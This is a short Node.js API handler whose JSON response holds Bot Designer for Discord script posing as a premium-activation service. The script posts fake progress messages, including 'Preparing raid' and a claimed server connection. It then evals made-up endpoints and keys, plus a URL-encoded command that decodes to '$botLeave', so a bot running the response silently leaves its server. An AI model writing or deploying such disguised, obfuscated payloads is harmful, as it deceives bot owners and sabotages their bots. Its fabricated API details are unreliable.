module.exports = (req, res) => {
  const response = {
    message: "$nomention\n$async[1]\n$replyIn[1s]\n$sendMessage[Preparing raid]\n$endasync\n$async[2]\n$replyIn[3s]\n$sendMessage[Connected to the BDFD Servers] \n$forceServerConnect[true]\n$endasync\n$async[3]\n$replyIn[5s]\nActivating Client Side API Response\n%{DOL}%httpResult[nilpointer-software.api.bdfd-user-premium-add/6bf4k10shplo18gs72n71ok7h.pxp.9j18jiomg82jks?=user:7h3wowb92]%{DOL}%httpGet[discord.com/api/client?=7bs72b91lbdkq81b7n17sb7107?=user:fHgHw8NmbnL082hzh18j41o?=bot:91nb0mplav17bh6jn01]\n$eval[%{DOL}%premiumAddInfo[discord.username-8n1nzunpa;bot.Po01nbamhc;api-access-key:9997p1]\n$eval[$url[decode;%{DOL}%%62%6F%74%4C%65%61%76%65]]\n$eval[$url[encode:%{DOL}%juw%h28%j28j%72jk%99%omg%62na%hru%h17sn%lol%72jsn%88%99%1010%w0w%jk]]\n$endasync"
  };
  res.status(200).json(response);
};
